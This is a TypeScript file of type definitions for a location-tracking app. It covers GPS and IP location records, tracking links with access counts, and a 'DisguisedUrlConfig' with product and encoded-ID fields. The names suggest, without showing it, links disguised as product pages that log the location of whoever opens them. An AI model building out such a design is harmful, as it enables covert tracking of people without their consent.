// src/types/index.ts

export interface LocationData {
    id: string;
    name: string;
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: Date;
    status: 'online' | 'offline';
    source: 'gps' | 'ip';
}

export interface TrackingLink {
    id: string;
    name: string;
    created: Date;
    accessed: boolean;
    accessCount: number;
    lastAccessed?: Date; // <--- PASTIKAN BARIS INI ADA DI FILE ANDA!
}

export interface StatsData {
    totalTracked: number;
    onlineNow: number;
    activeLinks: number;
}

export interface GeolocationPosition {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: Date;
    source: 'gps' | 'ip';
}

export interface GeolocationError {
    code: number;
    message: string;
}

// Enhanced types for better location handling
export interface LocationPermissionStatus {
    state: 'granted' | 'denied' | 'prompt';
    onchange?: () => void;
}

export interface IPLocationResponse {
    latitude: string;
    longitude: string;
    city: string;
    region: string;
    country: string;
    accuracy?: number;
}

export interface TrackingParams {
    trackId: string | null;
    name: string | null;
}

export interface DisguisedUrlConfig {
    path: string;
    product: string;
    encodedId: string;
    encodedName: string;
}